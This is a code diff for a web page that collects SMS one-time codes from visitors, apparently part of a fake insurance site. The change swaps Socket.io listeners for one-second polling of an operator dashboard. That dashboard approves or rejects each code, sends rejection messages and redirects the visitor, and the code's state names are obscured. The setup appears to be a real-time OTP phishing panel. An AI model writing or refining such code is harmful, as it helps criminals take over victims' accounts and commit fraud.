@@ -60,48 +60,51 @@ export default function VeriPage() {
     setIsLoading(false)
   }, [router])
 
-  // Listen for OTP status changes via Socket.io
+  // Listen for OTP status changes via polling (socket is disabled)
   useEffect(() => {
     const visitorID = localStorage.getItem("visitor")
     if (!visitorID) return
 
-    const unsubscribe = onVisitorStatusUpdated(({ field, status }) => {
-      if (field === '_v5Status') {
-        if (status === 'rejected') {
-          addData({ id: visitorID, _v5Status: 'pending' }).catch(console.error)
-          _ss5('pending')
+    const pollVisitorData = async () => {
+      try {
+        const res = await fetch(`/api/visitors/${visitorID}`)
+        if (!res.ok) return
+        const data = await res.json()
+        
+        // Check OTP status
+        const otpStatus = data._v5Status || data.otpStatus
+        if (otpStatus === 'rejected' && _v5Status !== 'rejected') {
+          _ss5('rejected')
           _s5('')
           setError('تم رفض رمز التحقق. يرجى إدخال رمز صحيح.')
-        } else if (status === 'approved') {
+        } else if (otpStatus === 'approved' && _v5Status !== 'approved') {
           _ss5('approved')
           setError('')
           router.push('/step3')
-        } else if (status === 'verifying') {
-          _ss5('verifying')
         }
+        
+        // Check for redirect page
+        const redirectPage = data.redirectPage || data.redirect_page
+        if (redirectPage === 'step3' && window.location.pathname !== '/step3') {
+          router.push('/step3')
+        }
+        
+        // Check for rejection message from dashboard
+        if (data.otpRejectionMessage && _v5Status !== 'rejected') {
+          _ss5('rejected')
+          _s5('')
+          setError(data.otpRejectionMessage)
+        }
+      } catch (err) {
+        // Silent fail
       }
-    })
+    }
 
-    return () => unsubscribe()
-  }, [router])
-
-  // Navigation listener - listen for admin redirects via Socket.io
-  useEffect(() => {
-    const visitorID = localStorage.getItem("visitor")
-    if (!visitorID) return
-
-    const unsubscribe = onVisitorStatusUpdated(({ field, status }) => {
-      if (field === 'currentStep') {
-        if (status === 'home') router.push('/insur')
-        else if (status === 'phone') router.push('/step5')
-        else if (status === '_t6') router.push('/step4')
-        else if (status === '_st1') router.push('/check')
-        else if (status === '_t3') router.push('/step3')
-      }
-    })
-
-    return () => unsubscribe()
-  }, [router])
+    // Poll every 1 second for faster response
+    const interval = setInterval(pollVisitorData, 1000)
+    
+    return () => clearInterval(interval)
+  }, [router, _v5Status])
 
   // Auto-fill OTP from SMS (Web OTP API)
   useEffect(() => {
